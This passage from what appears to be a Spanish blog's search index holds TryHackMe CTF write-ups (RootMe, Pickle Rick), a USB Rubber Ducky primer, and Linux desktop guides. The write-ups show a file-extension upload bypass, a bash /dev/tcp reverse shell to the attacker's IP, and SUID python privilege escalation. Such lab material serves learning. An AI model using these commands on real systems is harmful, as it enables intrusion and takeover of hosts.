Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.243/FUZZ Parámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario El wfuzz nos reporta lo siguiente\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 312 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 311 Ch \u0026#34;js\u0026#34; 000005520: 301 9 L 28 W 314 Ch \u0026#34;panel\u0026#34; 000000164: 301 9 L 28 W 316 Ch \u0026#34;uploads\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; Al entrar al /panel se ve un sitio para subir archivos\nProbamos con subir una foto random, y vemos que aparece en el /uploads\nVulnerabilidad web Viendo esto vamos a intentar subir un archivo .php para crear una reverse shell, este archivo es de pentestmonkey https://github.com/pentestmonkey/php-reverse-shell\nPrimero lo pasamos a nuestra máquina\ngit clone https://github.com/pentestmonkey/php-reverse-shell Después nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Y ahora lo subimos el archivo a /panel\n¡Error!\nNo acepta archivos php, Los administradores pueden hacer una lista negra de extensiones de archivos específicas y evitar que los usuarios carguen archivos con extensiones que se consideran peligrosas. Esto se puede omitir mediante el uso de extensiones alternativas o incluso no relacionadas.\nEjemplo extensiones php \u0026mdash;\u0026gt; .phtml, .php3, .php4, .php5\nVamos a probar con la primera (.phtml), le cambiamos el nombre al archivo, de php-reverse-shell.php a php-reverse-shell.phtml\nAhora ya le gusta\nDesde /uploads le damos al archivo que hemos subido y recibimos una conexión\n❯ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.108.243] 37418 Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 13:52:50 up 48 min, 0 users, load average: 0.00, 0.00, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Flags En /var/wwwesta la primera flag user.txt\nLa flag de root está en el /root, pero no tenemos permisos para acceder, Con el comando history, se pueden ver dos comandos interesantes\u0026hellip;\n10 find / -perm /4000 11 python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; El comando find / -perm /4000 lo que hace es buscar todos los programas con permiso SUID, en este caso python tiene permiso SUID\n¿Qué es el permiso SUID?\nHay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta. Un ejemplo es el comando passwd, el cual necesita tener privilegios de root, ya que tiene que acceder a los ficheros /etc/passwd o /etc/shadow en modo escritura. Estos programas constituyen un peligro potencial en un sistema, ya que si se hace un mal uso de ellos y el propietario tiene privilegios, root, el que lo ejecuta podrá hacer en el sistema todo lo que el propietario del programa tenga permitido.\nEl comando python -c 'import os; os.execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-p\u0026quot;)' lo que hace es spawnear una bash y como python se ejecuta como root, la bash que spawnea es como root\nAhora ya podemos ver la flag con cat /root/root.txt\n","date":"2022-12-11","id":146,"permalink":"/writeups/tryhackme/rootme/","summary":"Un ctf para principiantes, me puedes rootear?\nhttps://tryhackme.com/room/rrootme\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.108.243\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","python","file upload"],"title":"RootMe"},{"content":"Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafío temático de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en un ser humano a partir de un pepinillo.\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.26.25\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.26.25 PING 10.10.26.25 (10.10.26.25) 56(84) bytes of data. 64 bytes from 10.10.26.25: icmp_seq=1 ttl=63 time=63.6 ms --- 10.10.26.25 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 63.615/63.615/63.615/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.26.25 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬──────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.26.25 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.11.105 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d1ed3a0a8738271e3eafc898ea5b27 (RSA) | 256 7396d9e64c6a499612a1b46f571db2 (ECDSA) |_ 256 669f61effb12c69123cbc6280a5d1a (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Parámetro Función -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos De momento no hay nada raro\u0026hellip;\nReconocimiento web Al entrar a la web lo primero que se ve es lo siguiente\nEl texto traducido al español es:\nAyuda Morty!\nEscucha Morty\u0026hellip; Necesito tu ayuda, me he vuelto a convertir en un pepinillo y esta vez no puedo volver a cambiar.\nNecesito que BURRRP \u0026hellip;.Morty, inicia sesión en mi computadora y encuentra los últimos tres ingredientes secretos para terminar mi poción de pepinillo inverso. ¡El único problema es que no tengo idea de cuál era la contraseña BURRRRRRRRP ! ¡Ayuda Morty, ayuda!\nCon control + u se puede ver si hay algo en el codigo de la web.\nEn una línea se puede ver un comentario que contiene el nombre de un usuario\n\u0026lt;!-- Note to self, remember username! Username: R1ckRul3s --\u0026gt; Buscando subdirectorios Para buscar subdirectorios e intentado con wfuzz (wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.170:8080/FUZZ) y con gobuster (gobuster -u 10.10.43.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir) pero tardaban mucho. Asi que probe con un script de nmap llamado http-enum\n❯ nmap -p80 --script=http-enum 10.10.43.4 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 01:05 CET Nmap scan report for 10.10.43.4 Host is up (0.064s latency). PORT STATE SERVICE 80/tcp open http | http-enum: | /login.php: Possible admin folder |_ /robots.txt: Robots file Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds El nmap reporta 2: robots.txt y login.php\nrobots.txt Al entrar a robots.txt solo se ve una frase Wubbalubbadubdub\nlogin.php Al entrar a login.php hay un panel para iniciar sesión, al poner el usuario del principio y la frase del robots.txt de contraseña se abre una página llamada portal.php que hay varias secciones, pero hay una que se llama commands en la cual se pueden ejecutar comandos\nInfiltración Vamos a intentar crear una reverse shell mediante esa ejecución de comandos.\nnc -nlvp 443 Para ponernos en escucha por el puerto 443\nAhora desde de la web vamos a intentar ejecutar lo siguiente:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1 443 = Puerto en el que estamos en escucha 10.10.10.10 = Ip de nuestra máquina\nPero no recibimos nada\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Ahora si ya tenemos la reverse shell.\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm \u0026ldquo;Flags\u0026rdquo; Para resolver la máquina necesitamos saber los tres ingredientes.\nEl primero lo encontramos en el directorio /var/www/html en un archivo llamado Sup3rS3cretPickl3Ingred.txt El segundo está en /home/rick en un archivo llamado second ingredients El último está en el directorio /root, pero no tenemos acceso, al probar con un sudo su, no pide la contraseña y ya podemos visualizar el último ingrediente que está en un archivo llamado 3rd.txt ","date":"2022-12-10","id":147,"permalink":"/writeups/tryhackme/pickle-rick/","summary":"Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!\nhttps://tryhackme.com/room/picklerick\nEste desafío temático de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en un ser humano a partir de un pepinillo.","tags":["CTF","Fácil","Linux"],"title":"Pickle Rick"},{"content":"¿Qué es un USB Rubber Ducky? Rubber ducky es un pendrive con unas características especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc. El Rubber Ducky, es un dispositivo que inyecta pulsaciones de teclas previamente definidas. Fue desarrollado por hak5 y se puede conseguir desde su web actualmente por $79.99.\nLo que lo hace tan peligroso es que los antivirus no lo detectan, porque los ordenadores lo interpretan como un teclado.\nEl Rubber ducky ha salido en alguna serie como por ejemplo Mr.Robot.\n(Escena mr.robot)\n¿Como usarlo? Lo primero es sacar la tarjeta micro sd que hay en su interior y meterla en el adaptador, para conectarlo al ordenador Ahora toca crear los scripts para indicarle que es lo que tiene que hacer en cada momento. Para ello se usa el lenguaje de programación Duckyscript DuckyScript Es un lenguaje muy sencillo que se puede usar desde cualquier editor de texto. Además sirve para más dispositivos de hak5 como por ejemplo:\nDuckyScript™ Version Device Compatibility 1.0 Original USB Rubber Ducky (USB-A Only) 2.x Bash Bunny, Key Croc, Packet Squirrel, LAN turtle, Shark Jack, O.M.G Devices 3.0 New USB Rubber Ducky (USB-A \u0026amp; USB-C) REM (Comentarios) Para hacer comentarios se usa REM\nREM Esto no se va a interpretar DELAY El comando DELAY índica al USB que se pare momentáneamente, esto es útil para scripts que por ejemplo abren una ventana o una aplicación y tiene que esperar a que cargue\nDELAY 1000 STRING STRING sirve para que escriba una frase o palabra, el usb automáticamente aprieta el shift en las mayúsculas y la barra espaciadora para los espacios, pero no interpreta los espacios finales\nSTRING Hello world! Lo que escribirá el RubberDucky\nHello world! STRINGLN Es como el string pero al final hace un enter\nTeclas movimiento Se pueden usar para desplazarse por una ventana o aplicación.\nUP DOWN LEFT RIGHT UPARROW DOWNARROW LEFTARROW RIGHTARROW PAGEUP PAGEDOWN HOME END INSERT DELETE DEL BACKSPACE TAB SPACE Teclas del sistema Son utilizadas principalmente por el sistema operativo para funciones especiales y pueden usarse para interactuar con áreas de texto y navegar por la interfaz de usuario.\nENTER ESCAPE PAUSE BREAK PRINTSCREEN MENU APP F1 F2 F3 F4 F5 F6 F7 F8 F9 F0 F11 F12 Teclas de modificación Básicas Son teclas que se combinan con otra tecla para realizar una función especial\nSHIFT ALT CONTROL CTRL COMMAND WINDOWS GUI REM Ejemplo de teclas de modificación REM Windows Run GUI r REM Cerrar Ventana ALT F4 REM Pegar CTRL c Avanzadas Se pueden combinar entre ellas\nCTRL SHIFT ALT SHIFT COMMAND CTRL COMMAND CTRL SHIFT COMMAND OPTION COMMAND OPTION SHIFT CONTROL ALT DELETE Independientes Para pulsar una tecla modificadora sola se tiene que poner antes INJECT_MOD\nREM Ejemplo presionando la tecla de Windows sola INJECT_MOD WINDOWS Teclas de Bloqueo Las teclas de bloqueo alternan entre activado y desactivado\nCAPSLOCK NUMLOCK SCROLLOCK Botón Dentro del Rubber Ducky hay un pequeño botón el cual se puede combinar con los scripts, por defecto, al pulsarlo reinicia el script que tiene cargado, pero se puede modificar su función:\nWAIT_FOR_BUTTON_PRESS Sirve para pausar el script hasta que se presione el botón\nREM Ejemplo uso de WAIT_FOR_BUTTON_PRESS STRING Hello World! WAIT_FOR_BUTTON_PRESS STRING Has presionado el botón... BUTTON_DEF Define una función que se ejecutará cuando se presione el botón en cualquier momento dentro del script, siempre que el botón no esté ya en uso por el comando WAIT_FOR_BUTTON_PRESS u otra función similar.\nBUTTON_DEF STRING Has presionado el botón. END_BUTTON DISABLE_BUTTON y ENABLE_BUTTON Como su propio nombre indica, sirve para desactivar y activar el botón.\nDISABLE_BUTTON REM Botón desactivado ENABLE_BUTTON REM Botón activado LED El Ruber Ducky En su interior tiene un pequeño LED el cual se puede controlar en los scripts\nLED_OFF Apaga el led\nLED_R Pondrá el led rojo\nLED_G Pondrá el led verde\n¿Dónde Programarlo? En el apartado de soporte del RubberDucky se puede descargar un JSEncoder, es un archivo con extension .html. En linux se abre con firefox jsencoder.html y en windows: click derecho, abrir con, navegador\nCambiar idioma de los scripts El Rubber Ducky tiene la distribución de teclado inglés por defecto, para poder cambiarlo hay que descargar el idioma deseado desde https://github.com/hak5/usbrubberducky-payloads/tree/master/languages para después ponerlo en el jsencoder\nPrimer hola mundo Para que el Rubber Ducky haga un hola mundo, hay que poner en el jsencoder lo sieguiente:\nDELAY 200 STRING Hola Mundo!!! Ahora solo hace falta clicar a generate payload y se descargará un archivo llamado inject.bin, el cual se tiene que poner en la tarjeta micro sd (solo puede haber un inject.bin, (borra los antiguos).\nComo protegerse Lo primero y más obvio es no dejarte ordenadores, móviles, impresoras, etc\u0026hellip; desbloqueados.\nExiste un programa para windows que se queda corriendo en segundo plano y te protege de el Rubber ducky y dispositivos similares. No lo e probado pero por lo que e visto por internet, cuando detecta el RubberDucky lo para, bloquea el ordenador y guarda todas las pulsaciones de teclado del RubberDucky para ver las intenciones del atacante\nhttps://lospi.net/beamgun/\n","date":"2022-12-05","id":148,"permalink":"/blog/cuidado-con-este-usb/","summary":"Rubber ducky es un pendrive con unas características especiales, a diferencia de un pendrive normal en el que puedes guardar archivos, fotos, etc. El Rubber Ducky, es un dispositivo que inyecta pulsaciones de teclas previamente definidas.","tags":["USB","hak5"],"title":"¡Cuidado con este USB!"},{"content":"¿Qué es? Es un simple módulo para la polybar que muestra que canción se está reproduciendo y se pueden añadir botones para pausar y pasar canciones.\n¿Como añadirlo a la polybar? Para añadirlo a la polybar se tienen que seguir los siguientes dos pasos: irte al archivo donde tengas los módulos de la polybar, en mi caso ~/.config/polybar/modules.ini, y abajo del todo copiar lo siguiente\nMódulos Módulo Song Añádelo si quieres que salga la canción que se està reproduciendo\u0026hellip; [module/song] type = custom/script exec = ~/.config/bin/song.sh interval = 1 format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; Módulo Previous Añádelo si quieres tener el botón para reproducir la canción anterior [module/previous] type = custom/script exec = ~/.config/bin/previous.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Previous Módulo Next Añádelo si quieres tener el botón para reproducir la canción siguiente [module/next] type = custom/script exec = ~/.config/bin/next.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.Next Módulo Play Añádelo si quieres tener el botón para parar y reproducir una canción [module/play] type = custom/script exec = ~/.config/bin/play.sh interval = 1 ;format-prefix = \u0026#34; \u0026#34; format = \u0026lt;label\u0026gt; click-left = dbus-send --print-reply --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.mpris.MediaPlayer2.Player.PlayPause Archivos Para que los módulos funcionen hay que poner los siguientes archivos en la carpeta ~/.config/bin/ ¡Acuérdate de darle permisos de ejecución a todos con chmod +x!\nsong.sh Contenido del archivo song.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) echo $song - $artist else echo \u0026#34;\u0026#34; fi next.sh Contenido del archivo next.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi previous.sh Contenido del archivo previous.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi play.sh Contenido del archivo play.sh #!/bin/bash if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then echo \u0026#34;\u0026#34; else echo \u0026#34;\u0026#34; fi ¡Novedad Animated Song! Algunas personas que usaron estos módulos me comentaron que al escuchar canciones muy largas, les ocupaba mucho espacio en la polybar, por eso hice con la ayuda de b3nder0n el siguiente script, que básicamente lo que hace es animar el texto de la canción para que solo ocupe x caracteres previamente definidos\u0026hellip;\nConfiguración Para su configuración es casi igual que los otros módulos, los pasos son los siguientes\nArchivos Para su correcto funcionamiento hay que crear los siguientes archivos ~/.config/bin/ y no te olvides de darles permiso de ejecución con chmod\nanimated.sh Contenido del animated.sh #!/bin/bash lenght=15 if [[ \u0026#34;$(dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames)\u0026#34; == *org.mpris.MediaPlayer2.spotify* ]]; then artist=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/artist/{getline; getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) song=$(dbus-send --print-reply --session --dest=org.mpris.MediaPlayer2.spotify /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:\u0026#39;org.mpris.MediaPlayer2.Player\u0026#39; string:\u0026#39;Metadata\u0026#39; | awk \u0026#39;/title/{getline; split($0,a,\u0026#34;\\\u0026#34;\u0026#34;); print a[2]}\u0026#39;) text=\u0026#34;阮 $song - $artist \u0026#34; num_char=$(echo -n $text | wc -c) text2=${text// /#} if [[ $lenght \u0026lt; $num_char ]];then letter=$(cat ~/.config/bin/progress.txt) times=0 result=() for (( i=0 ; i \u0026lt; ${#text} ; i++ )) { a[$i]=${text2:i:1} } until [ $lenght -lt $times ]; do letter=$(($letter + 1)) times=$(($times + 1)) if [[ $letter -lt $num_char ]]; then result+=(${a[$letter]}) else letter=-1 fi done echo $(($letter - $times + 1)) \u0026gt; ~/.config/bin/progress.txt echo ${result[@]} | tr -d \u0026#34; \u0026#34; | tr \u0026#34;#\u0026#34; \u0026#34; \u0026#34; else echo $text fi else echo \u0026#34;\u0026#34; fi progress.txt Hace falta crear un archivo llamado progress.txt, tambien en ~/.config/bin/ Módulo Para su correcto funcionamiento hay que añadirlo abajo del todo en el archivo de módulos de la polybar, en mi caso ~/.config/polybar/modules.ini y después activarlo en el config.ini\n[module/animated-song] type = custom/script exec = ~/.config/bin/animated.sh interval = 1 format = \u0026lt;label\u0026gt; Para graduar la velocidad se tiene que cambiar el valor de interval, el número de interval equivale a la velocidad por carácter.\nPara modificar el máximo de caracteres se tiene que especificar en la variable lenght del animated.sh\n","date":"2022-11-29","id":149,"permalink":"/blog/m%C3%B3dulo-polybar-spotify/","summary":"Si usas polybar, supongo que alguna vez habrás pensado en poner un módulo para poder controlar spotify y ver que canción está sonando. En este post vas a aprender como hacerlo","tags":["Linux","bash","polybar","Spotify"],"title":"Módulo Polybar Spotify"},{"content":"","date":"2022-11-29","id":150,"permalink":"/tags/polybar/","summary":"","tags":[],"title":"polybar"},{"content":"","date":"2022-11-29","id":151,"permalink":"/tags/spotify/","summary":"","tags":[],"title":"Spotify"},{"content":"En esta guía explico como puedes crear tu propio entorno completamente personalizable y desde 0, para que puedas dar tu 100% en tu trabajo o estudios. ¡Aviso! Esta guía está pensada para distribuciones basadas en debían aunque se puede hacer en otras también, pero los comandos cambiaran\nEjemplos de entornos hechos por mí:\nEjemplo 1\nEjemplo 2\nBspwm ¿Qué es? Bspwm es un gestor de ventanas tipo mosaico, lo cual va muy bien para escribir y programar. Aunque si necesitas hacer tareas en las cuales necesites otro entorno de escritorio, puedes cambiarlo en el menú de login.\n¿Cómo se instala? sudo apt install bspwm Configuración El archivo de configuración de bspwm se tiene que mover a ~/.config/bspwm/bspwmrc\nbspwmrc default:\n#! /bin/sh pgrep -x sxhkd \u0026gt; /dev/null || sxhkd \u0026amp; bspc monitor -d I II III IV V VI VII VIII IX X bspc config border_width 2 bspc config window_gap 12 bspc config split_ratio 0.52 bspc config borderless_monocle true bspc config gapless_monocle true bspc rule -a Gimp desktop=\u0026#39;^8\u0026#39; state=floating follow=on bspc rule -a Chromium desktop=\u0026#39;^2\u0026#39; bspc rule -a mplayer2 state=floating bspc rule -a Kupfer.py focus=on bspc rule -a Screenkey manage=off Ahí puedes personalizar la cantidad de espacios de trabajo que quieras, puedes poner programas que se ejecuten al abrir bspwm, configurar bordes, etc\u0026hellip;\nPolybar ¿Qué es? Polybar es una herramienta para crear la barra de estado, es totalmente personalizable, las únicas dos limitaciones que tiene es que no la puedes poner a la derecha o a la izquierda y que no puedes poner imágenes.\n¿Cómo se instala? sudo apt install polybar Configuración La Polybar se divide en diferentes módulos como por ejemplo el módulo de la fecha, wifi, etc\u0026hellip; puedes usar los de los temas, añadir módulos extras o crearlos todos desde 0\nTemas Existen muchos temas ya creados para la polybar como por ejemplo\ngithub.com/adi1090x/polybar-themes\nSi os gustan o los usáis no olvidéis apoyar al creador dándole una estrella en github\n¿Cómo instalar los temas?: adi1090x\n#Clonar el Repositorio git clone https://github.com/adi1090x/polybar-themes #Y entrar en la carpeta, dar permisos de ejecución al setup.sh y ejecutarlo. cd polybar-themes chmod +x setup.sh ./setup.sh Mi tema\n#Clonar el repositorio git clone https://github.com/d3b0o/dotfiles #Crear la carpeta de configuraciones de la polybar y mover la configuración ahí. cd dotfiles mv polybar ~/.config/polybar Ahora en el ~/.config/polybar/ tenéis todos los temas instalados.\n¿Qué hace cada archivo? Cada tema tiene los siguientes archivos (Algunos temas tienen otros archivos, pero al final todos tienen lo mismo)\nArchivo Función config.ini Archivo que contiene la configuración general de la polybar modules.ini Configuración de los módulos bars.ini Configuración de los módulos con barras colors.ini Todos los colores launch.sh Al ejecutarlo, se muestra la polybar, para que se muestre la polybar cada vez que abrimos el bspwm tendremos que agregar la ruta del launch en el ~/.config/bspwm/bspwmrc user_modules.ini Ahí están todos los módulos de usuario Módulos Configuración módulos Principales configuraciones de los módulos\nVariables Función interval En interval puedes poner cada cuanto tiempo quieres que se actualice (en segundos) format-prefix Puedes poner el icono que quieras format-prefix-foreground El color del icono label Puedes escoger que es lo que quieres que ponga, en Available tokens tinenes las opciones disponibles format Puedes escoger el formato que quieres que tenga, en Available tokens tinenes las opciones disponibles ¿Cómo crear un módulo? Plantilla para módulo script [module/] type = custom/script interval = exec = En exec se tiene que poner el script que quieres que el output salga en la polybar\nPlantilla para módulo texto [module/] type = custom/text content = En content va el texto que quieres que salga en la polybar\nEn los módulos puedes añadir que al clicar ejecute algo\u0026hellip;\nclicks posibles click-left = click-middle = click-right = scroll-up = scroll-down = double-click-left = double-click-right = sxhkd ¿Qué es? sxhkd es un simple servicio de combinaciones de teclas usables dentro de bspwm, requerido para comunicarse con bspwm y lanzar aplicaciones a elección.\n¿Cómo se instala? git clone https://github.com/baskerville/sxhkd.git cd sxhkd make Configuración Para la configuración hay que tener el siguiente archivo en ~/.config/sxhkd/sxhkdrc\nhttps://github.com/baskerville/bspwm/blob/master/examples/sxhkdrc\n¿Cómo añadir comandos personalizados? Abajo del archivo de configuración (~/.config/sxhkd/sxhkdrc)\n#combinación de teclas #que ejecutara #Ejemplo super + shift + g google-chrome Picom ¿Qué es? Picom, es lo que se conoce como un compositor para Xorg. Se trata de un fork de compton que a su vez es un fork de otros compositorios. Este compositor te permite utilizar tanto sombras, como transparencias, como redondear bordes, etc\u0026hellip;\n¿Cómo se instala? #dependencias sudo apt install libxext-dev libxcb1-dev libxcb-damage0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render-util0-dev libxcb-render0-dev libxcb-randr0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-xinerama0-dev libxcb-glx0-dev libpixman-1-dev libdbus-1-dev libconfig-dev libgl-dev libegl-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev meson git clone https://github.com/ibhagwan/picom.git cd picom git submodule update --init --recursive meson --buildtype=release . build ninja -C build sudo ninja -C build install Configuración El archivo de configuración de picom está en ~/.config/picom/picom.conf, en él puedes modificar los bordes, sombras, transparencias, etc\u0026hellip;\nEsto es lo que contiene el picom.conf\nhttps://gist.github.com/scheckley/b91d7b50c7f372ba7107baf01127da3a\nRofi ¿Qué es? Rofi comenzó como un clon de simpleswitcher, escrito por Sean Pringle, un conmutador de ventana emergente basado aproximadamente en superswitcher. Simpleswitcher sentó las bases y, por lo tanto, Sean Pringle merece la mayor parte del crédito por esta herramienta. Rofi (renombrado, ya que perdió la propiedad simple) se ha ampliado con funciones adicionales, como un iniciador de aplicaciones y un iniciador de ssh, y puede actuar como un reemplazo de dmenu directo, lo que lo convierte en una herramienta muy versátil.\nRofi, como dmenu, proporcionará al usuario una lista textual de opciones donde se pueden seleccionar una o más. Esto puede ser ejecutar una aplicación, seleccionar una ventana u opciones proporcionadas por un script externo.\n¿Cómo se instala? sudo apt install rofi Configuración Temas Al igual que la polybar hay muchos temas ya creados como por ejemplo:\ngithub.com/adi1090x/rofi\nSi usáis u os gustan los temas no olvidéis darle una estrella en github\nPara instalar el tema es simplemente:\ngit clone 2--depth=1 https://github.com/adi1090x/rofi.git cd rofi chmod +x setup.sh ./setup.sh Configuración temas Todos los temas están en el ~/.config/rofi\nEn el github de los temas hay fotos de todos los temas y puedes escoger el que más te guste\nPara abrir rofi simplemente tienes que ejecutar él .sh que hay en la carpeta de los temas\n","date":"2022-11-25","id":152,"permalink":"/blog/como-personalizar-tu-entorno-linux/","summary":"Los entornos que vienen por defecto en distribuciones de pentesting como kali o parrot son muy poco productivos. En este post vas a ver un ejemplo de un gestor de ventanas de tipo \u0026lsquo;Tiling\u0026rsquo; llamado bspwm, el cual te va a hacer ser mucho más productivo y rápido con tu trabajo","tags":["Linux","Personalización"],"title":"Como Personalizar Tu Entorno Linux"},{"content":"","date":"2022-11-25","id":153,"permalink":"/categories/linux/","summary":"","tags":[],"title":"Linux"},{"content":"","date":"2022-11-25","id":154,"permalink":"/tags/personalizaci%C3%B3n/","summary":"","tags":[],"title":"Personalización"}]